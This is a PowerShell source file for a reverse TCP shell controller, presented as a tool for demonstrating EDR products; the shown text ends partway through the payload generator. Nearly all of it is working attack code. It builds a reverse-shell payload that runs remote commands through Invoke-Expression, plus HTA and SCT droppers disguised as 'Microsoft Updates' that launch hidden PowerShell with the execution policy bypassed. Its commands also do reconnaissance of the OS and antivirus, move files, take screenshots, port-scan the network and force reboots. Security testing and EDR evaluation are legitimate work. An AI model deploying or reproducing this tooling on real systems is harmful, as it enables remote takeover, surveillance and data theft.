#
# ReverseTCPPowerShell - Used for demonstrating EDR products. 
#
# Copyright(C) 2021 Michael Logan, ObstreperousMadcap@gmail.com
# Repo: https://github.com/ObstreperousMadcap/villainius
#
# This program is free software : you can redistribute it and /or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version. This program is distributed in 
# the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
# even the implied warranty of MERCHANTABILITY or FITNESS FOR A 
# PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see https://www.gnu.org/licenses/.
#
# Inspired by https://github.com/ZHacker13/ReverseTCPShell

# To run fully automated: 
# . 'ReverseTCPShell.ps1' -automated -controllerPort <port> -automationScript <filename>

[CmdletBinding(DefaultParameterSetName='noAutomation')] # Forces either "no parameters" or "all parameters".
param
(
    [Parameter(ParameterSetName="automation", Mandatory=$true)] [switch]$automated,
    [Parameter(ParameterSetName="automation", Mandatory=$false)] [string]$controllerPort = "666",
    [Parameter(ParameterSetName="automation", Mandatory=$true)] [string]$automationScript
);

# Contains function names for user commands. Use UPPERCASE for the values, 
# and name all functions "cmd_<FUNCTIONNAME>". The "cmd_" prevents collision
# with PowerShell commands. This technique was chosen to simplify the logic
# for processing interactive input and to modularize the app so as to make
# it easy to add new packages and automate its use.
$userCommandFunctionNames = 
    "cmd_HELP",
    "cmd_CLEAR",
    "cmd_EXIT",
    "cmd_WAIT",
    "cmd_INFO-OS", 
    "cmd_INFO-IP", 
    "cmd_INFO-AV",
    "cmd_UPLOAD", 
    "cmd_DOWNLOAD", 
    "cmd_SCREENSHOT",
    "cmd_PORTSCAN",
    "cmd_EICAR-AV",
    "cmd_EICAR-PUO",
    "cmd_EICAR-AMSI",
    "cmd_REBOOT";

Function cmd_HELP
{
    $continue = $true;

    # Contains short descriptions of user commands.
    $resultMessage = 
        "`n" +
        "-------------------------------------------------------------------------------`n" +
        "Remote Command           Description`n" +
        "-------------------------------------------------------------------------------`n" +
        "Info-OS                  Dowmload operating system info.`n" +
        "Info-IP                  Download public IP info.`n" +
        "Info-AV                  Download antivirus info.`n" +
        "Upload <filename>        Upload file from ControllerContent folder.`n" +
        "Download <filename>      Download file to ExploitResults folder.`n" +
        "Screenshot               Download screenshot to ExploitResults folder.`n" +
        "Portscan                 Scan network for open ports.`n" +
        "EICAR-AV                 Perform EICAR antivirus test.`n" +
        "EICAR-PUO                Perform EICAR potentially unwanted object (PUO) test.`n" +
        "EICAR-AMSI               Perform EICAR Antimalware Scan Interface (AMSI) test.`n" +
        "Reboot                   Reboot.`n" +
        "`n" +
        "-------------------------------------------------------------------------------`n" +
        "Local Command            Description`n" +
        "-------------------------------------------------------------------------------`n" +
        "Help                     Show this command list.`n" +
        "Clear                    Clear the local screen.`n" +
        "Exit                     Exit the application.`n" +
        "-------------------------------------------------------------------------------`n" +
        "`n";

        # Local Command "Wait <seconds>" is not included in the "help" content displayed to
        # users because it is intended only for use in during automated scenarios.

    return $continue, $resultMessage;
};

function cmd_CLEAR
{
    Clear-Host;

    $continue = $true;
    $resultMessage = $null;

    return $continue, $resultMessage;
};

function cmd_EXIT
{
    $arguments = 
    @{
        remoteCommand = "Exit" 
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    $continue = $false;
    $resultMessage = $null;

    return $continue, $resultMessage;
}

Function cmd_WAIT
{
    # Intended for use during automation to place a delay between
    # commands to better simulate an attacker's activity timeline.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    if ($userCommandParameterCount -gt 0)
    {
        $waitDuration = [double]$userCommandParameters[0];
        if ($waitDuration -gt 0)
        {
            Start-Sleep -Seconds $waitDuration;
        }
    }

    $continue = $true;
    $resultMessage = " ";
    return $continue, $resultMessage;
};

Function cmd_INFO-OS
{
    # Queries the remote endpoint's Common Information Model (CIM) services, 
    # e.g. Windows Management Instrumentation (WMI), for various properties
    # of the operating system. The results are part of a malwactor's  
    # reconnaisance that allows them to tailor their attack accordingly.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $csName = "(Get-CimInstance Win32_OperatingSystem).CSName";
    $osCaption = "(Get-CimInstance Win32_OperatingSystem).Caption";
    $osVersion = "(Get-CimInstance Win32_OperatingSystem).Version";
    $osArchitecture = "(Get-CimInstance Win32_OperatingSystem).OSArchitecture";
    $locale = "(Get-CimInstance Win32_OperatingSystem).Locale";
    $windowsDirectory = "(Get-CimInstance Win32_OperatingSystem).WindowsDirectory";
    $localDateTime =  "(Get-CimInstance Win32_OperatingSystem).LocalDateTime";
    $powershellVersion = "(`$PSVersionTable.PSVersion.ToString())";

    $remoteCommand = 
        "`"~Hostname: `" + $csName +"+
        "`"~OS Caption: `" + $osCaption +" +
        "`"~OS Version: `" + $osVersion +" +
        "`"~OS Architecture: `" + $osArchitecture +" +
        "`"~Locale: `"+ $locale +" +
        "`"~Windows Directory: `" + $windowsDirectory +"+
        "`"~Local Date-Time: `" + $localDateTime +" +
        "`"~PowerShell Version: `" + $powershellVersion;";
        ;

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;

        # The tilde is used to separate each section of the remote command because 
        # a newline proved too challenging to incorporate directly (might try again
        # in the future). The tilde in the output is replaced with newline before
        # returning the results. 
        $resultMessage = $resultMessage.Replace("~", "`n");
        $resultMessage = (
            ("-" * 25) +
            "`nOperating System Information`n" +
            $resultMessage +
            ("-" * 25)) +
            "`n";
    }

    return $continue, $resultMessage;
};

Function cmd_INFO-IP
{
    # Queries public sources for information about the public IP used by the
    # remote endpoint. The results are part of a malwactor's reconnaisance that
    # allows them to determine the potential value of the target and tailor their 
    # attack according to business type, geolocation, etc.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = "(`$(Invoke-WebRequest -UseBasicParsing -Uri `"http://ipinfo.io/json`").Content)";

    $arguments = 
    @{
        remoteCommand = $remoteCommand;
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;

        # Remove the JSON wrappers around and the spaces in front of the 
        # text so that it is left-justified and easier to read.
        $resultMessage = ((((
            $resultMessage.Replace("`"", "")
                         ).Replace(",`n", "`n")
                         ).Replace("{", "")
                         ).Replace("`n}", "")
                         ).Replace("  ", "");
        $resultMessage = (
            ("-" * 25) +
            "`nPublic IP Address Information`n" +
            $resultMessage +
            ("-" * 25)) +
            "`n";
    }

    return $continue, $resultMessage;
};

Function cmd_INFO-AV
{
    # Queries the remote endpoint's Common Information Model (CIM) services, 
    # e.g. Windows Management Instrumentation (WMI) service, for details about
    # antivirus products installed. The results are part of a malwactor's 
    # reconnaisance that allows them to tailor their attack accordingly.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );
    
    <# NOTE: Not yet used - need to find a way to incorporate into remote command.
    $antivirusProductStateCodes = "
        `$avProductStateCodes = @{
        `"262144`" = `"Disabled; Up to Date`";
        `"266240`" = `"Enabled; Up to Date`";
        `"393472`" = `"Disabled; Up to Date`";
        `"397584`" = `"Enabled; Out of Date`";
        `"397568`" = `"Enabled; Up to Date`";
        `"397312`" = `"Enabled; Up to Date`";
        `"393216`" = `"Disabled; Up to Date`"
    }";
    $antivirusProductStateCodes = (($antivirusProductStateCodes.Replace("`r","")).Replace("`n    ","")).Replace("    ","");
    #>

    $remoteCommand = 
        "`$(" +
            "foreach (`$antivirusProduct in (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct))" +
            "{" +
                "`"~Display Name: `"+`$antivirusProduct.DisplayName+" +
                "`"~Instance GUID: `"+`$antivirusProduct.instanceGuid+" +
                "`"~Path to Signed Product EXE: `"+`$antivirusProduct.pathToSignedProductExe+" +
                "`"~Path to Signed Reporting EXE: `"+`$antivirusProduct.pathToSignedReportingExe+" +
                "`"~Product State: `"+`$antivirusProduct.productState+" +
                "`"~Timestamp: `"+`$antivirusProduct.timestamp;" +
            "}" +
        ")";

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
        
        # The tilde is used to separate each section of the remote command because 
        # a newline proved too challenging to incorporate directly (might try again
        # in the future). The tilde in the output is replaced with newline before
        # returning the results. 
        $resultMessage = $resultMessage.Replace("~", "`n");
        $resultMessage = (
            ("-" * 25) +
            "`nAntivirus Applications Installed`n" +
            $resultMessage +
            ("-" * 25)) +
            "`n";
    }

    return $continue, $resultMessage;
};

Function cmd_UPLOAD
{
    # Uploads a file from ControllerContent folder on the controller (local)
    # to the current folder on the remote endpoint. At this time, the current
    # folder on the controller cannot be changed. A relative path does work
    # (bad code?). A local filename must be included after the "upload"
    # command.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    if ($userCommandParameterCount -eq 0)
    {
        $localFilename = $null;
        $continue = $true
        $resultMessage = "***Error: A filename must be specified.`n";
    }
    else 
    {
        $localFilename = "$controllerContentPath\$($userCommandParameters[0])";
    }
    
    if (!([string]::IsNullOrEmpty($localFilename)))
    {
        if (([System.IO.File]::Exists("$localFilename")))
        {
            If (!($automated))
            {
                Write-Host -NoNewline ("Please wait... ");
            }

            $localFileBytes = [io.file]::ReadAllBytes("$localFilename") -join ',';
            $localFileBytes = "($localFileBytes)";
            $localFilename = $localFilename.Split('\')[-1];
            $localFilename = $localFilename.Split('/')[-1];
            $remoteCommand = 
                "`$filename = `"" + $($localFilename) + "`";" +
                "`$fileBytes = " + $($localFileBytes) + ";" +
                "if (!([System.IO.File]::Exists(`"`$pwd\`$filename`")))" +
                "{" +
                    "[System.IO.File]::WriteAllBytes(`"`$pwd\`$filename`",`$fileBytes);" +
                    "`"Success: `$filename uploaded.`";" +
                "}" +
                "else" +
                "{" +
                    "`"***Error: `$filename already exists remotely.`";" +
                "};";

            $arguments = 
            @{
                remoteCommand = $remoteCommand
                networkStream = $networkStream
            };
            $continue, $resultMessage = SendRemoteCommand @arguments;

            if ($continue)
            {
                $arguments = 
                @{
                    networkStream = $networkStream
                    timespan = 5
                };
                $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
            }
        }  
        else 
        {
            $continue = $true
            $resultMessage = "***Error: $localFilename does not exist locally.`n";
        }
    }
    else
    {
        $continue = $true;
        $resultMessage = "";
    }   

    return $continue, $resultMessage;
};

Function cmd_DOWNLOAD
{
    # Downloads a file from the current folder on the remote endpoint to the
    # $outputPath folder on the controller (local). At this time, the $outputPath
    # cannot be changed. A local filename must be included after the "upload"
    # command.

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    if ($userCommandParameterCount -eq 0)
    {
        $remoteFilename = $null;    
        $continue = $true
        $resultMessage = "***Error: A filename must be specified.`n";
    }
    else 
    {
        $remoteFilename = $userCommandParameters[0];
    }
 
    if (!([string]::IsNullOrEmpty($remoteFilename)))
    {
        if (!($automated))
        {
            Write-Host -NoNewline ("Please wait... ");
        }

        $remoteCommand = 
            "`$filename = `"" + $($remoteFilename) + "`";" +
            "if (([System.IO.File]::Exists(`"`$pwd\`$filename`")))" +
            "{" +
                "[System.IO.File]::ReadAllBytes(`"`$pwd\`$filename`") -join ',';" +
            "}" +
            "else" +
            "{" +
                "`"***Error: Remote file `$filename does not exist remotely .`";" +
            "};";
    
        $arguments = 
        @{
            remoteCommand = $remoteCommand
            networkStream = $networkStream
        };
        $continue, $resultMessage = SendRemoteCommand @arguments;

        $arguments = 
        @{
            networkStream = $networkStream
            timespan = 5
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;

        if ($resultMessage.Substring(0, 9) -ne "***Error:")
        {
            if (!([System.IO.File]::Exists("$outputPath\$remoteFilename")))
            {
                $fileBytes = Invoke-Expression("($resultMessage)");
                [System.IO.File]::WriteAllBytes("$outputPath\$remoteFilename", $fileBytes);
                $resultMessage = "Success: $remoteFilename downloaded.`n";
            }
            else
            {
                $resultMessage = "***Error: $remoteFilename already exists locally.`n";
            }
        }
    }

    $continue = $true;
    return $continue, $resultMessage;
};

Function cmd_SCREENSHOT
{
    # Downloads a screenshot from the remote endpoint to the $outputPath folder
    # on the controller (local). At this time, the $outputPath cannot be changed. 

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = 
        "`$remoteFilename = New-TemporaryFile;" +
        "rename-item `$remoteFilename `$([io.path]::changeextension(`$remoteFilename, `"jpg`"));" +
        "Add-Type -assemblyName System.Windows.Forms;" +
        "`$screenSizedBitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);" +
        "`$drawingSurface = [System.Drawing.Graphics]::FromImage(`$screenSizedBitmap);" +
        "`$drawingSurface.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$screenSizedBitmap.Size);" +
        "`$drawingSurface.Dispose();" +
        "`$screenSizedBitmap.Save(`"`$remoteFilename`",[System.Drawing.Imaging.ImageFormat]::Jpeg);" +
        "if (([System.IO.File]::Exists(`"`$remoteFilename`")))" +
        "{" +
            "[io.file]::ReadAllBytes(`"`$remoteFilename`") -join ',';" +
            "Start-Sleep -Seconds 5;" +
            "Remove-Item -Path `"`$remoteFilename`" -Force;" +
        "}";

    If (!($automated))
    {
        Write-Host -NoNewline ("Please wait... ");
    }

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;

        if ($continue)
        {
            if ($resultMessage -ne " ")
            {   
                $remoteHostIPAddress = $tcpClientConnection.Client.RemoteEndPoint.Address.IPAddressToString;
                $filename = "Screenshot_$(Get-Date -Format yyyyMMddHHmmss).jpg";

                if (!([System.IO.File]::Exists("$outputPath\$filename")))
                {
                    $fileBytes = Invoke-Expression("($resultMessage)");
                    [System.IO.File]::WriteAllBytes("$outputPath\$filename", $fileBytes);
                    $resultMessage = "Success: Screenshot downloaded - $filename.`n";
                }
                else
                {
                    $resultMessage = "***Error: Screenshot already exists - $filename.`n";
                }
            }
            else
            {
                $continue = $true;
                $resultMessage = "***Error: Screenshot not received.`n";
            }
        }
    }

    return $continue, $resultMessage;
};

Function cmd_PORTSCAN
{
    # Performs a portscan of the remote endpoint's entire /24 network using a fixed 
    # set of ports. At this time, the ports cannot be changed. 

    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    If (!($automated))
    {
        Write-Host ("Please wait - this may take up to 10 minutes...");
    }

    $remoteHostIPNetwork = [string]::Join(".",(([IPAddress]((([IPAddress]$remoteHostIPAddress).Address) -band ([IPAddress]"255.255.255.0").Address)).IPAddressToString).split("."), 0, 3)
    $testEndpoints = [string]::Join(",", @(1..254));
    $testPorts = "21, 22, 23, 25, 53, 80, 110, 135, 137, 138, 139, 443, 445, 1433, 1434, 2323, 3389, 8080";
    $portscanTCPTimeout = 100
    
    $remoteCommand = 
        "foreach (`$endpointNumber in $testEndpoints)" +
        "{" +
            "`$openPorts = `$null;" +
            "`$portscanEndpoint = `"$remoteHostIPNetwork.`$endpointNumber`";" +
            "foreach (`$testPort in $testPorts)" +
            "{" +
                "`$portscanTCPClient = New-Object -TypeName System.Net.Sockets.TCPClient;" +
                "`$portscanSocket = `$portscanTCPClient.BeginConnect(`"`$portscanEndpoint`", `$testPort,`$null,`$null);" +
                "`$asyncResult = `$portscanSocket.AsyncWaitHandle.WaitOne($portScanTCPTimeout);" +
                "if (`$asyncResult)" +
                "{" +
                    "try" +
                    "{" +
                        "`$null = `$portscanTCPClient.EndConnect(`$portscanSocket);" +
                        "`$portOpen = `$true;" +
                    "}" +
                    "catch" +
                    "{" +
                        "`$portOpen = `$false;" +
                    "}" +
                    "finally" +
                    "{" +
                        "if (`$portOpen)" +
                        "{" +
                            "`$openPorts += `"`$testPort `";" +
                        "}" +
                    "}" +
                "}" +
                "`$portscanTCPClient.Dispose();" +
            "}" +
                "if (!([string]::IsNullOrEmpty(`$openPorts)))" +
                "{" +
                    "`$resultMessage += `"`$portscanEndpoint```: `$openPorts``n`";" +
                "}" +
            "}" +
       "`$resultMessage;";
                        
        $arguments = 
        @{
            remoteCommand = $remoteCommand
            networkStream = $networkStream
        };
        $continue, $resultMessage = SendRemoteCommand @arguments;
    
        if ($continue)
        {
            $arguments = 
            @{
                networkStream = $networkStream
                timespan = 10
            };
            $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
        }
        $resultMessage =
            ("-" * 25) +
            "`nOpen Ports on Network $remoteHostIPNetwork.x/$((Get-NetIPAddress -ipaddress "$(((Get-NetIPConfiguration).IPv4Address).IPAddress)").PrefixLength)`n" +
            "Ports Tested: $testPorts`n`n" +
            $resultMessage +
            ("-" * 25) +
            "`n";

    return $continue, $resultMessage;
};

Function cmd_EICAR-AV
{
    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = "Set-Content -Path `".\EICAR.COM`" -Value `"X5O!P%@AP[4\PZX54(P^)7CC)7}```$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!```$H+H*`"";

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
    }

    return $continue, $resultMessage;
};

Function cmd_EICAR-PUO
{
    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = "Set-Content -Path `".\EICAR-PUO.COM`" -Value `"X5]+)D:)D<5N*PZ5[/EICAR-POTENTIALLY-UNWANTED-OBJECT-TEST!```$*M*L`""
    
    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
    }

    return $continue, $resultMessage;
};

Function cmd_EICAR-AMSI
{
    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = "powershell echo `'`"X5O!P%@AP[4\PZX54(P^)7CC)7}```$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!```$H+H*`"`'";

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    if ($continue)
    {
        $arguments = 
        @{
            networkStream = $networkStream
        };
        $continue, $resultMessage = ReceiveRemoteCommandOutput @arguments;
    }

    return $continue, $resultMessage;
};

Function cmd_REBOOT
{
    param
    (
        [Parameter(Mandatory = $true)] [boolean]$automated,
        [Parameter(Mandatory = $true)] [System.Net.Sockets.NetworkStream]$networkStream,
        [Parameter(Mandatory = $true)] [string]$remoteHostIPAddress,
        [Parameter(Mandatory = $true)] [string]$controllerContentPath,
        [Parameter(Mandatory = $true)] [string]$outputPath,
        [Parameter(Mandatory = $true)] [int]$userCommandParameterCount,
        [Parameter(Mandatory = $false)] [AllowEmptyString()] [string[]]$userCommandParameters
    );

    $remoteCommand = "shutdown `/t 0 `/r `/f";

    $arguments = 
    @{
        remoteCommand = $remoteCommand
        networkStream = $networkStream
    };
    $continue, $resultMessage = SendRemoteCommand @arguments;

    return $false, $null;
};

function GetControllerTCPPort
{
    # Obtains the port on which the controller will be listening. The port
    # is needed to create the reverse shell payload that the remote endpoint
    # will use to connect to the controller. When this script is run in
    # automated mode the port must be included in the command and this function
    # will not be used. In interactive mode the malwactor is promoted for a 
    # port. 666 is the default, and the malwactor may simply hit <enter> when
    # prompted. The port chosen is checked to see if it is currently in use; if
    # it is, the malwactor is prompted for a different port.

    # TO-DO: Either (a) Update this function so that in automated mode it 
    # confirms the port is unused and, if not, the script exists; or (b) Update
    # this function and the script to use a random unused port in automated mode.

    param
    (
        [Parameter(Mandatory = $false)] [string]$controllerPort = "666"
    );

    $validPort = $false;
    while (!($validPort))
    {
        Write-Host -NoNewline ("Controller Port ($controllerPort): ");
        $trialPort = Read-Host;

        if ($trialPort -eq [string]::empty) # Malwactor hit <enter> - use the default.
        {
            $trialPort = $controllerPort;
        }

        if ($trialPort.Length -gt 5)
        {
            Write-Host ("***Error: Invalid number of characters entered - (1 <= length <= 5).");
        }
        elseif (!($trialPort -match "^\d+$"))
        {
            Write-Host ("***Error: Invalid characters - must be numeric.");
        }
        elseif ((([int]$trialPort -lt 1) -or ([int]$trialPort -gt 65535)))
        {
            Write-Host ("***Error: Invalid port value (0 < port < 65536).");
        }
        elseif (($(Get-NetTCPConnection).LocalPort) -contains $trialPort)
        {
            Write-Host ("***Error: Port in use.");
        }
        else
        {
            $controllerPort = $trialPort;
            $validPort = $True;
        }
    }

    return $controllerPort;
};

function GenerateRemoteHostPayload
{
    param
    (
        [Parameter(Mandatory = $true)]$controllerPort,
        [Parameter(Mandatory = $true)]$outputPath
    )

    $remoteDebug = "`$false"; # Use with caution - the logfile will contain contents of files uploaded/downloaded, and screenshots.
    $controllerIPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback'}).IPAddress;
    $powershellPayload = 
        "Invoke-Expression `$("+
            "`$scriptFolder=`$PSScriptRoot;" +
            "`$_buffer=[System.Byte[]]::CreateInstance([System.Byte],1024);" +
            "`$_tcpClientSocket=New-Object System.Net.Sockets.TCPClient(`'$controllerIPAddress`', $controllerPort);" +
            "`$_timeout = new-timespan -Minutes 15;" +
            "`$_stopwatch = [diagnostics.stopwatch]::StartNew();" +
            "while ((`$_networkStream=`$_tcpClientSocket.GetStream()) -and (`$_stopwatch.elapsed -lt `$_timeout))"+
            "{" + 
                "while (`$_networkStream.DataAvailable)" +
                "{" +
                    "`$_networkStreamSize=`$_networkStream.Read(`$_buffer,0,`$_buffer.length);" +
                    "`$_remoteCommandString+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$_buffer,0,`$_networkStreamSize);" +
                "};" +
                "if (`$_remoteCommandString)" +
                "{" +
                    "if ($remoteDebug){Add-Content -Path `$scriptFolder\RemoteDebug.log -Value `"`$(Get-Date -Format HH:mm:ss)`n`$_remoteCommandString`n`"};" +
                    "`$_resultsString=(Invoke-Expression(`$_remoteCommandString)2>&1|Out-String);" +
                    "if (!(`$_resultsString.length%`$_buffer.count))" +
                    "{" +
                        "`$_resultsString+=`' `';" +
                    "};" +
                    "`$_resultsASCIIBytes=([text.encoding]::ASCII).GetBytes(`$_resultsString);" +
                    "`$_networkStream.Write(`$_resultsASCIIBytes,0,`$_resultsASCIIBytes.length);" +
                    "`$_networkStream.Flush();" +
                    "`$_remoteCommandString=`$_null;" +
                    "`$_stopwatch = [diagnostics.stopwatch]::StartNew();" +
                "};" +
                "Start-Sleep -Milliseconds 1;" +
            "};" +
        ");";

    $htaPayload =
        "<!DOCTYPE html PUBLIC `"-//W3C//DTD XHTML 1.0 Transitional//EN`" `"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd`">`n" +
        "<html xmlns=`"http://www.w3.org/1999/xhtml`">`n" +
            "<head>`n" +
                "<meta content=`"text/html; charset=utf-8`" http-equiv=`"Content-Type`" />`n" +
                "<title>Microsoft Updates</title>`n" +
                "<script language=`"VBScript`">`n" +
                    "set oShell = CreateObject(`"Wscript.Shell`")`n" +
                    "oShell.Run(`"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c $powershellPayload`"),0,true`n" +
                    "self.close()`n" +
                "</script>`n" +
                "<hta:application`n" +
                    "id=`"oHTA`"`n" +
                    "applicationname=`"Microsoft Updates`"`n" +
                    "application=`"yes`"`n" +
                ">`n" +
                "</hta:application>`n" +
            "</head>`n" +
            "<body>`n" +
            "</body>`n" +
        "</html>`n";

    $sctPayload =
        "<?XML version=`"1.0`"?>`n" +
        "<scriptlet>`n" +
            "<registration `n" +
                "progid=`"ReverseTCPShell`" `n" +
                "classid=`"{F0001111-0000-0000-0000-0000DEADBEEF}`"`n>" +
                "<script language=`"JScript`">`n" +
                    "<![CDATA[`n" +
                        "ps = `'powershell.exe -w h -nologo -noprofile -ep bypass `';`n" +
                        "c = `"$powershellPayload`";`n" +
                        "r = new ActiveXObject(`"WScript.Shell`").Run(ps + c,0,true);`n" +
                    "]]>`n" +
                "</script>`n" +
            "</registration>`n" +
        "</scriptlet>`n";

    Set-Content -Path "$outputPath\Payload_PowerShell-$controllerPort.ps1" -Value $powershellPayload;
